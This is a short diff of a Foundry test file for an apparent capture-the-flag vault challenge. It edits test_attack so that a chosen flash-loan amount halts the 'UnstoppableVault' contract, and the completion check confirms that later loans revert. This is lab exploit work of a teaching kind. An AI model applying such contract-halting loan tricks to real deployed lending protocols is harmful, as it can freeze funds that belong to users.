@@ -47,12 +47,17 @@ contract UnstoppableVaultTest is Test {
     }
 
     function test_attack() external {
-        receiver.executeFlashLoan(1_000_000e18 - 1);
+        // Does not halt contract
+        // receiver.executeFlashLoan(4_999_999e17);
+
+        // Does halt contract
+        receiver.executeFlashLoan(5_000_000e17);
+
         _isCompleted();
     }
 
     function _isCompleted() internal {
         vm.expectRevert();
-        receiver.executeFlashLoan(100 ether);
+        receiver.executeFlashLoan(100e18);
     }
 }
